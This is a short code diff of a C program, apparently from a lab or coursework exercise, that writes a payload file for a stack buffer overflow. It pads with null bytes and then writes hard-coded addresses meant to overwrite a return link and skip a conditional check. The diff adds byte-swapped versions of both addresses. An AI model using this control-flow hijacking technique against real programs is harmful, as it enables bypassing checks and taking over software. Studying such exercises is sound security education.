@@ -29,10 +29,12 @@ int main(void){
       putc('\0', psFile); /* Writes '00000000' */
    
 
-   preturnLink = 0x400850;
+   preturnLink = 0x00400850;
+   preturnLink = 0x50084000;
    fwrite(&preturnLink, sizeof(unsigned long), 1, psFile);
 
-   pskipIf = 0x40088c;
+   pskipIf = 0x0040088c;
+   pskipIf = 0x8c084000;
    fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
